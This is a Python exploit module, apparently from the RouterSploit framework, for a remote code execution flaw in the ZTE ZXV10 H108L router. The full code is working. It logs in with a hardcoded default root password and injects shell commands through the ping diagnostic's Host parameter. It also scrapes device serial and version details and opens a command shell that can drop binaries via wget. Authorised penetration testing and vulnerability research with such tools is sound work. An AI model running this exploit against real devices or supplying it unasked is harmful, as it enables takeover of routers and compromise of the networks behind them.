import re
import time
import requests

from routersploit import (
    exploits,
    mute,
    validators,
    print_error,
    print_success,
    print_status,
    shell,
    http_request,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for ZTE ZXV10 H108L remote code execution vulnerability.
    If the target is vulnerable it allows to execute commands on operating system level.
    """
    __info__ = {
        'name': 'ZTE ZXV10 RCE',
        'description': 'Exploits ZTE ZXV10 H108L remote code execution vulnerability '
                       'that allows executing commands on operating system level.',
        'authors': [
            'Anastasios Stasinopoulos',  # vulnerabiltiy discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://github.com/stasinopoulos/ZTExploit/',
        ],
        'devices': [
            'ZTE ZXV10 H108L',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    username = exploits.Option('root', 'Username to log in with')
    password = exploits.Option('W!n0&oO7.', 'Password to log in with')

    def __init__(self):
        self.session = requests.Session()

    def run(self):
        if self.login():
            print_success("Target seems to be vulnerable")
            self.info()

            print_status("Invoking command loop")
            shell(self, architecture="mips", method="wget", binary="wget", location="/tmp")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):

        path = "/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch&Host=;echo $({})&NumofRepeat=1&" \
               "DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit".format(cmd)
        url = "{}:{}{}".format(self.target, self.port, path)
        try:
            response = http_request("GET", url, self.session)
            time.sleep(3)

            url = "{}:{}/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch".format(self.target, self.port)
            response = http_request("GET", url, self.session)
            time.sleep(1)

            res = re.findall(r'textarea_1">(.*) -c', response.text)
            if len(res):
                return res[0]
            else:
                res1 = re.findall(r'textarea_1">(.*)', response.text)
                if res1[0] == "-c 1 -s 64":
                    return ""
                else:
                    res2 = re.findall(r'(.*) -c', response.text)
                    res = res1 + res2
                    if res[0] != "</textarea>":
                        return res[0]
        except:
            pass

        return ""

    def info(self):
        url = "{}:{}/template.gch".format(self.target, self.port)

        try:
            response = http_request("GET", url, self.session)
        except:
            return

        # Check for Model Name
        Frm_ModelName = re.findall(r'Frm_ModelName" class="tdright">(.*)<', response.text)
        if len(Frm_ModelName):
            print_status("Model Name: {}".format(Frm_ModelName[0]))

        # Check for Serial Number
        Frm_SerialNumber = re.findall(r'Frm_SerialNumber" class="tdright">(.*)', response.text)
        if len(Frm_SerialNumber):
            print_status("Serial Number: {}".format(Frm_SerialNumber[0]))

        # Check for Hardware Version
        Frm_HardwareVer = re.findall(r'Frm_HardwareVer" class="tdright">(.*)<', response.text)
        if len(Frm_HardwareVer):
            print_status("Software Version: {}".format(Frm_HardwareVer[0]))

        # Check for Boot Loader Version
        Frm_BootVer = re.findall(r'Frm_BootVer"  class="tdright">(.*)<', response.text)
        if len(Frm_BootVer):
            print_status("Boot Loader Version: {}".format(Frm_BootVer[0]))

    def login(self):
        url = "{}:{}/".format(self.target, self.port)

        try:
            response = http_request("GET", url, self.session)
            if response is None:
                return

            print_status("Retrieving random login token...")
            Frm_Logintoken = re.findall(r'Frm_Logintoken"\).value = "(.*)";', response.text)

            if len(Frm_Logintoken):
                Frm_Logintoken = Frm_Logintoken[0]
                print_status("Trying to log in with credentials {} : {}".format(self.username, self.password))

                url = "{}:{}/login.gch".format(self.target, self.port)

                data = {"Frm_Logintoken": Frm_Logintoken,
                        "Username": self.username,
                        "Password": self.password}

                response = http_request("POST", url, self.session, data=data)
                if "Username" not in response.text and "Password" not in response.text:
                    print_success("Successful authentication")
                    return True
        except:
            pass

        return False

    @mute
    def check(self):
        if self.login():
            return True  # target is vulnerable

        return False  # target is not vulnerable
